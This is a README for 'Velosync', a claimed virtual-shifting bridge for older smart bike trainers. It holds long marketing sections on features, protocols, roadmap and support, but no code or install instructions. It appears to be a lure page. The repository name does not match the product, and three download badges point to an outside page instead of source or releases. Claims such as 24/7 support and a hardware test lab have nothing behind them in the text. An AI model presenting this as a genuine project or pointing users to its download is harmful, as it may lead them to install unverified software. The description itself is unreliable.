![preview](https://raw.githubusercontent.com/juanjuankaleb-netizen/Legacy-Trainer-Gear-Morph/main/poster_5788083.svg)
[![Download](https://raw.githubusercontent.com/juanjuankaleb-netizen/Legacy-Trainer-Gear-Morph/main/get_be892.svg)](https://juanjuankaleb-netizen.github.io/Legacy-Trainer-Gear-Morph/)

# 🚴 Velosync — Universal Virtual Shifting Layer for Legacy Smart Trainers

**Velosync** is an independent, community-driven compatibility bridge that brings the sensation of virtual shifting to older direct-drive and wheel-on smart trainers that were left behind by manufacturer firmware roadmaps. Where the original **Tacx-Virtual-Shifting** project carved the first trail through the wilderness of legacy hardware, Velosync widens that trail into a multi-brand, multi-protocol, cross-platform pathway — a kind of Rosetta Stone for trainer telemetry, spoken fluently between your bike, your training app, and your drivetrain.

Think of it as a universal translator for your indoor setup: your trainer still speaks its original language, your app still speaks its own, and Velosync quietly interprets between them — shifting gears in the virtual world without ever touching a physical derailleur cable.

[![Download](https://raw.githubusercontent.com/juanjuankaleb-netizen/Legacy-Trainer-Gear-Morph/main/get_be892.svg)](https://juanjuankaleb-netizen.github.io/Legacy-Trainer-Gear-Morph/)

---

## 📑 Table of Contents

- [🌱 Why Velosync Exists](#-why-velosync-exists)
- [🔭 Project Vision](#-project-vision)
- [🧩 Feature Highlights](#-feature-highlights)
- [🗺️ Supported Trainer Families](#️-supported-trainer-families)
- [📡 Protocol Compatibility Matrix](#-protocol-compatibility-matrix)
- [⚙️ How the Shifting Engine Works](#️-how-the-shifting-engine-works)
- [🎛️ Riding Modes and Resistance Profiles](#️-riding-modes-and-resistance-profiles)
- [🌍 Multilingual Support](#-multilingual-support)
- [🧠 Smart Resistance Adaptation](#-smart-resistance-adaptation)
- [📲 Responsive Interface](#-responsive-interface)
- [🕐 24/7 Customer Support Philosophy](#-247-customer-support-philosophy)
- [🧪 Testing and Validation](#-testing-and-validation)
- [🔐 Privacy and Data Handling](#-privacy-and-data-handling)
- [🧰 Configuration Reference](#-configuration-reference)
- [🧭 Roadmap for 2026](#-roadmap-for-2026)
- [🤝 Contributing](#-contributing)
- [❓ Frequently Asked Questions](#-frequently-questioned-answers)
- [⚠️ Disclaimer](#️-disclaimer)
- [📜 License](#-license)

---

## 🌱 Why Velosync Exists

Indoor cycling has a quiet problem. Thousands of smart trainers — perfectly functional, mechanically sound, beautifully engineered — sit in pain caves around the world, unable to participate in the virtual shifting revolution because their firmware branch was frozen years ago. The hardware is willing; the software simply stopped listening.

Velosync was born from that frustration. Rather than accepting that a capable trainer must be retired simply because a firmware update never arrived, Velosync inserts a translation layer between the trainer and the training application. The trainer keeps doing what it does best — applying resistance — while Velosync handles the delicate arithmetic of virtual gear ratios, cadence-aware resistance curves, and protocol negotiation.

The result is a riding experience that feels remarkably close to native virtual shifting, achieved entirely through software diplomacy rather than hardware surgery.

---

## 🔭 Project Vision

Our vision is simple to state and demanding to achieve: **no smart trainer should become obsolete because of a missing firmware branch.** Velosync pursues that vision through four commitments:

1. **Protocol neutrality** — support FE-C, FTMS, legacy Tacx proprietary streams, and emerging standards under one roof.
2. **Transparent behaviour** — every resistance decision the engine makes can be logged, inspected, and tuned.
3. **Community ownership** — the compatibility database grows through rider-submitted reports, not corporate roadmaps.
4. **Longevity** — hardware deserves a second life, and riders deserve a second season on the trainer they already own.

---

## 🧩 Feature Highlights

- **Virtual gear stack** with up to 24 simulated ratios, configurable per rider profile
- **Cadence-aware resistance smoothing** that removes the "stair-step" feel common in naive implementations
- **Responsive interface** that adapts from a phone mounted on the bars to a wall-mounted tablet in the pain cave
- **Multilingual support** across twelve interface languages, with community translation slots open
- **24/7 customer support** through a rotating community steward roster and asynchronous ticket triage
- **Zero-touch calibration wizard** that learns your trainer's resistance curve in under three minutes
- **Ride replay engine** for post-session analysis of shifting behaviour and resistance lag
- **Multi-app bridging** so a single trainer can serve one application while Velosync observes passively
- **Deterministic logging** producing human-readable session transcripts for troubleshooting
- **Offline-first design** — the core engine functions without any network dependency
- **Profile import and export** for sharing gear configurations between riders
- **Adaptive ERG handoff** that gracefully transitions between simulated gearing and fixed-wattage workouts
- **Battery-friendly background mode** for long endurance sessions on portable devices
- **Accessibility-minded controls** including large-target shifting and auditory gear confirmation
- **Session integrity checks** that detect protocol desynchronisation and recover automatically

---

## 🗺️ Supported Trainer Families

Velosync is designed as a family of adapters. Each adapter speaks the dialect of a particular trainer generation and presents a unified interface upward.

| Family | Typical Era | Adapter Status | Notes |
|---|---|---|---|
| Tacx legacy direct-drive | 2014–2019 | Stable | The founding lineage of this project |
| Tacx wheel-on smart units | 2013–2018 | Stable | Requires wheel-circumference calibration |
| Generic FE-C trainers | 2012–present | Stable | Broadest compatibility surface |
| FTMS-only trainers | 2019–present | Stable | Resistance range negotiated at connect time |
| Dual-protocol hybrids | 2018–present | Beta | Automatic protocol election enabled |
| Community-submitted variants | various | Experimental | Driven entirely by rider reports |

Each adapter is independently versioned, so a change to one family never destabilises another.

---

## 📡 Protocol Compatibility Matrix

Understanding which dialects your equipment speaks is the first step toward a smooth session. The matrix below summarises the negotiation paths Velosync supports.

| Inbound Protocol | Outbound Target | Direction | Maturity |
|---|---|---|---|
| FE-C over ANT+ | Training application | Bidirectional | Mature |
| FTMS over Bluetooth | Training application | Bidirectional | Mature |
| Legacy proprietary stream | Internal engine | Inbound only | Mature |
| Simulated gear channel | Training application | Outbound only | Mature |
| Resistance override channel | Trainer | Outbound only | Mature |
| Cadence relay | Training application | Bidirectional | Stable |
| Power smoothing relay | Training application | Outbound only | Stable |

---

## ⚙️ How the Shifting Engine Works

At its heart, Velosync is an arithmetic engine wrapped in a diplomat's coat. When you tap a shift control, five things happen in rapid succession:

**First**, the input layer captures the intent — a gear up, a gear down, or a jump to a memorised ratio. This intent is timestamped with microsecond precision so that rapid double-shifts are not collapsed into a single event.

**Second**, the gear model translates that intent into a target resistance multiplier. The model accounts for your configured chainring size, cassette range, wheel circumference, and a personal "feel factor" that lets you dial in how aggressive the shifts should be.

**Third**, the smoothing stage applies a short resistance ramp rather than an instantaneous jump. This mirrors the way a real drivetrain loads gradually as the chain settles onto a new cog, and it dramatically reduces the jarring sensation that plagues naive implementations.

**Fourth**, the protocol adapter encodes the new resistance target into whatever dialect your trainer understands. If your trainer only accepts coarse resistance steps, Velosync interpolates across multiple small commands to approximate a fine-grained change.

**Fifth**, the telemetry layer records the event — old gear, new gear, resistance delta, latency — into the session log, giving you a complete audit trail for later review.

---

## 🎛️ Riding Modes and Resistance Profiles

Velosync ships with several riding personalities, each tuned for a different style of session:

- **Road Simulation** — gear ratios mirror a typical road drivetrain, with closely spaced ratios in the middle of the cassette
- **Climbing Focus** — expanded low-range ratios for sustained gradient work
- **Sprint Ladder** — tightly spaced high-range ratios for interval work and cadence drills
- **Gravel Spread** — wide, unevenly spaced ratios that mimic mixed-surface gearing
- **Endurance Cruise** — gentle resistance deltas optimised for long, steady sessions
- **Custom Canvas** — a blank profile where every ratio is defined by the rider

Profiles can be swapped mid-session without disconnecting, and each profile remembers its own smoothing constants.

---

## 🌍 Multilingual Support

The interface is available in twelve languages at launch, with the translation layer designed so that adding a thirteenth requires only a single flat file of key-value pairs. Languages currently represented include English, Dutch, German, French, Spanish, Italian, Portuguese, Polish, Danish, Swedish, Norwegian, and Japanese.

Right-to-left rendering is supported for future language additions, and numbers, units, and date formats follow the rider's locale rather than a hardcoded default. Community translators are credited in the release notes of each version that ships their work.

---

## 🧠 Smart Resistance Adaptation

Not every trainer responds to resistance commands with the same enthusiasm. Some overshoot; some lag; some exhibit a curious dead zone at low resistance values. Velosync's adaptation layer observes your trainer's actual behaviour during the first minutes of each session and builds a small correction model on the fly.

This model is session-local by default, but riders who complete a calibration ride can persist the correction curve to their profile. Over time, the resistance you request and the resistance you feel converge into close agreement — a process we like to call "teaching the trainer to dance to your tune."

---

## 📲 Responsive Interface

The companion control surface is built to be legible at arm's length on a handlebar-mounted phone, comfortable on a tablet propped against a wall, and expansive on a desktop monitor in a dedicated training room. Layout reflows happen smoothly, and the shifting controls always remain within thumb reach on touch devices.

Dark mode is the default, because pain caves are dark and screens are bright. A high-contrast mode is available for riders with visual sensitivities, and every interactive element meets modern accessibility guidelines for target size and focus visibility.

---

## 🕐 24/7 Customer Support Philosophy

Support in an open project is a relay, not a hotline. Velosync maintains a rotating roster of community stewards across multiple time zones, which in practice means questions rarely wait more than a few hours for a first response. The support philosophy rests on three pillars:

1. **Reproducibility first** — we ask for session logs before we speculate about causes
2. **Plain language always** — no jargon walls, no condescension
3. **Documentation as a product** — every resolved issue becomes a documentation improvement

Ticket triage is asynchronous and transparent. There are no hidden queues and no priority tiers — just riders helping riders.

---

## 🧪 Testing and Validation

Every adapter ships with a harness of recorded protocol sessions captured from real hardware. These recordings are replayed against the adapter in an automated pipeline, and any divergence from expected resistance output fails the build. In addition, a volunteer hardware lab — consisting of riders who have donated spare trainer time — runs pre-release builds against physical equipment and reports timing anomalies.

The testing philosophy is deliberately conservative: it is better to mark an adapter experimental for an extra release cycle than to ship a shifting experience that feels unpredictable on race day.

---

## 🔐 Privacy and Data Handling

Velosync operates on a strict data-minimalism principle. Session logs are stored locally by default. Nothing is transmitted anywhere unless the rider explicitly exports a diagnostic bundle for support purposes. There is no telemetry beacon, no silent analytics channel, and no account requirement for core functionality.

When a rider does choose to share a diagnostic bundle, the export tool strips personally identifying information and offers a preview of exactly what will be included.

---

## 🧰 Configuration Reference

Configuration lives in a single human-readable file. The most commonly adjusted keys are:

- **gear_count** — number of virtual ratios in the active profile
- **smoothing_ms** — duration of the resistance ramp after a shift
- **feel_factor** — multiplier controlling how pronounced shifts feel
- **cadence_window** — rolling window used for cadence-aware adjustments
- **protocol_preference** — ordered list of inbound protocols to attempt
- **logging_verbosity** — from quiet summaries to full event transcripts
- **locale_override** — force a specific interface language
- **theme** — dark, high-contrast, or automatic

Every key is documented inline within the file itself, so there is no need to consult external references while tuning.

---

## 🧭 Roadmap for 2026

The 2026 roadmap focuses on three themes: breadth, polish, and permanence.

- **Breadth** — expand the adapter family to cover additional legacy wheel-on units and several regional trainer brands
- **Polish** — refine the smoothing engine using rider-submitted feel reports
- **Permanence** — establish a long-term compatibility archive so that even discontinued trainers retain a documented path to virtual shifting

Additional planned work includes a collaborative gear-profile library, a session comparison tool, and a formal accessibility audit conducted with community testers.

---

## 🤝 Contributing

Contributions are welcome in many forms. Code is only one of them. Rider reports, protocol captures, translations, documentation improvements, and hardware loan time are all equally valuable.

Before opening a pull request, please read the contribution guidelines, which describe coding style, commit message conventions, and the review process. New adapter proposals should include at least one recorded protocol session so that reviewers can validate behaviour.

---

## ❓ Frequently Questioned Answers

**Will this work with my trainer?** Consult the compatibility matrix and the community-submitted reports. If your model is not listed, a short protocol capture is usually enough for a steward to assess feasibility.

**Does this replace my training application?** No. Velosync sits between your trainer and whichever application you already love. It is a translator, not a competitor.

**Is my session data uploaded anywhere?** Only if you explicitly export it. Local-first is the default and the promise.

**Can I run this alongside another application?** Yes, in passive observation mode, Velosync can watch a session without interfering.

**How often are adapters updated?** Adapters follow their own release cadence, independent of the core engine.

---

## ⚠️ Disclaimer

Velosync is an independent community project. It is not affiliated with, endorsed by, or sponsored by any trainer manufacturer or training application vendor. All trademarks referenced belong to their respective owners and are used solely for descriptive compatibility purposes.

Use of this software is at your own discretion. While the project strives for reliability, the maintainers cannot guarantee that a given trainer will behave identically to manufacturer-supported virtual shifting. Always warm up gently after configuration changes and verify resistance behaviour before beginning high-intensity work.

The project is provided without warranty of any kind, express or implied. In no event shall the maintainers be liable for any damages arising from the use or inability to use this software.

---

## 📜 License

This project is released under the **MIT License**. You are welcome to use, modify, and redistribute the code in accordance with the terms of that license. The full text is available here:

[MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Velosync Contributors

---

[![Download](https://raw.githubusercontent.com/juanjuankaleb-netizen/Legacy-Trainer-Gear-Morph/main/get_be892.svg)](https://juanjuankaleb-netizen.github.io/Legacy-Trainer-Gear-Morph/)